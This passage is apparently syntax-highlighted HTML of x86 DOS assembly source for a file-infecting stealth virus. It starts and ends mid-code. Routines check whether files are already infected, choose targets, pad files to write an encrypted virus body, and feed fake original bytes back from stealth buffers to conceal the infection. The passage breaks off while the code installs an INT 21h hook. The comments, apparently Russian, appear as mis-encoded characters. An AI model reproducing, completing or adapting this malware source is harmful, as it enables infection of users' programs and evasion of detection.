        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">length_of_original_file_info</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;‚å®¤: DX:AX - ¤«¨­­  ä ©« </span><span class="sc0">
</span><span class="sc5">q_file_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">check_file_infected</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
</span><span class="sc5">check_file_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">exit_stc_q_file_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">may_infect_this_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_stc_may_infect_this_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_stc_may_infect_this_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_stc_may_infect_this_file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">exit_stc_may_infect_this_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;‚å®¤: DS:DX - ¡ãää¥p £¤¥ ã¦¥ ¯p®ç¨â ­ë ¡ ©âë</span><span class="sc0">
</span><span class="sc1">;      AX    - ç¨á«® p¥ «ì­® ¯p®ç¨â ­­ëå ¡ ©â</span><span class="sc0">
</span><span class="sc5">move_faked_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;‘ª®«ìª® ¯p®ç¨â ­® ¡ ©â®¢</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_current</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_move_faked_bytes</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">exit_move_faked_bytes</span><span class="sc0">
        </span><span class="sc1">;DX.AX - ãª § â¥«ì áâ®ï« ­  ®¡« áâ¨ ä¥©ª </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;âªã¤  ¯¥p¥­®á¨âì «®¦­ë¥ ¡ ©âë</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;—¨á«® ¡ ©â áª®«ìª® ¬ë ¤®«¦­ë ¯®¤áâ ¢¨âì ¨áå®¤ï ¨§ ¯®«®¦¥­¨ï LSEEK</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">;‘ª®«ìª® ¯p®ç¨â ­® ¡ ©â</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">move_f_bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">move_f_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">     </span><span class="sc5">exit_move_faked_bytes</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[SI] -&gt; ES:[DI] ¥p¥­®á¨¬ «®¦­ë¥ ¡ ©âë</span><span class="sc0">
</span><span class="sc5">exit_move_faked_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">valid_stealth_handles</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_dses_cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">stealth_buffer_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">number_of_stealth_buffers</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">next_stealth_buffer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">bad_handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">good_handle</span><span class="sc0">
</span><span class="sc5">bad_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">good_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_stealth_buffer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">select_stealth_field</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_dses_cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">stealth_buffer_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">number_of_stealth_buffers</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">next_free_stealth_buffer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">free_handle_found</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_free_stealth_buffer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">free_handle_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;‚å®¤: DS:DX - ¨¬ï ä ©« </span><span class="sc0">
</span><span class="sc5">fill_stealth_field</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_carry_fill_stealth_field</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc1">;DX:AX</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">length_of_original_file_info</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">exit_carry_fill_stealth_field</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;¯¨á ­¨¥: ®¤¯à®£à ¬¬  ¨é¥â ¢ áâ¥«á ¡ãää¥à å HANDLE á®®â¢¥âá¢ãîé¨© BX</span><span class="sc0">
</span><span class="sc1">;‚å®¤:  BX   - Handle</span><span class="sc0">
</span><span class="sc1">;‚ëå®¤: CF=0 - ­ ©¤¥­ á®¢¯ ¤ îé¨© åí­¤« ¢ Stealth Buffers</span><span class="sc0">
</span><span class="sc1">;              (â®çª  ¢å®¤  pointer_to_active_stealth_buffer)</span><span class="sc0">
</span><span class="sc1">;       CF=1 - á®¢¯ ¤¥­¨© ­¥ ­ ©¤¥­®</span><span class="sc0">
</span><span class="sc5">select_stealth_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">stealth_buffer_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">number_of_stealth_buffers</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">seach_stealth_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">stealth_handle_found</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">seach_stealth_handle</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">stealth_handle_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">file_align</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">113h</span><span class="sc0">
</span><span class="sc5">write_file_align</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc1">;DX.AX</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">length_virus_on_file</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc1">;DX.AX</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">exit_stc_write_file_align</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc1">;DX - ®áâ â®ª</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">exit_stc_write_file_align</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">install_int21_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">int21_hook</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">hooked_win_int21</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_install_int21_hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
